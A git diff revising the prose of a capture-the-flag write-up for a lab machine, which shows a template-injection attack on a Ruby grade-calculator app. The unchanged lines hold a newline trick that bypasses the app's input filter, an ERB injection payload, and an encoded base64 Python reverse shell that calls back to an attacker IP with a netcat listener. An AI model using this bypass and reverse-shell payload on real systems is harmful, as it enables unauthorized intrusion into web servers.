@@ -57,7 +57,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
 
 ## User Flag
 
-<p>In Burp Suite, we can try</p>
+<p>We can fill out the fields seen above and send the request. With Burp Suite, we can intercept it to see what is going on. Then, we can alter one of the parameters to test for SSTI vulnerabilities:</p>
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -76,7 +76,7 @@ Upgrade-Insecure-Requests: 1
 category1={{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>In the response</p>
+<p>In the response, however, we see that the application is returning "Malicious input blocked".</p>
 
 ```html
 [...snip]
@@ -88,7 +88,7 @@ category1={{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&
 [...snip]
 ```
 
-<p>However, if we</p>
+<p>However, we can bypass the checks by adding a URL-encoded new line character (<custom-code>%0a</custom-code>).</p>
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -107,7 +107,7 @@ Upgrade-Insecure-Requests: 1
 category1=aa%0a{{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>And</p>
+<p>We see that the response no longer returns "Malicious input blocked".</p>
 
 ```html
 [...snip] Your total grade is 80%
@@ -115,7 +115,7 @@ category1=aa%0a{{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight
 [...snip]
 ```
 
-<p>We saw a reference to Sinatra in the error page. we can try an ssti ruby payload: <custom-code><%= 7*7 %> </custom-code></p>
+<p>We saw a reference to Sinatra in the error page, which means that the application is likely developed in Ruby. We can then try the following SSTI payload for Ruby's ERB: <custom-code><%= 7*7 %> </custom-code></p>
 
 ```html
      </form>
@@ -123,7 +123,7 @@ category1=aa%0a{{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight
 49 : 16%</p>
 ```
 
-<p>And it worked. We can now geenrate a reverse shell payload with GoPariah and send it in the request</p>´
+<p>And, as seen above, it worked. We can now geenrate a reverse shell payload with GoPariah and send it in the request</p>´
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -142,14 +142,14 @@ Upgrade-Insecure-Requests: 1
 category1=aa%0a<%25%3d+system("curl+10.10.16.8:9001?p=$(echo+-n+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjgiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc%3d+|+base64+-d+|+bash)")+%25>&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>WE will open a listener before sending it and we will get a connection back as "susan"</p>
+<p>We will open a listener before sending it and we will get a connection back as "susan"</p>
 
 ```bash
 nc -l 9001
 susan@perfection:~/ruby_app$
 ```
 
-<p>Once we are inside the machine, we can read the user flag</p>
+<p>We're in! Once we are inside the machine, we can read the user flag</p>
 
 ## Root Flag
 
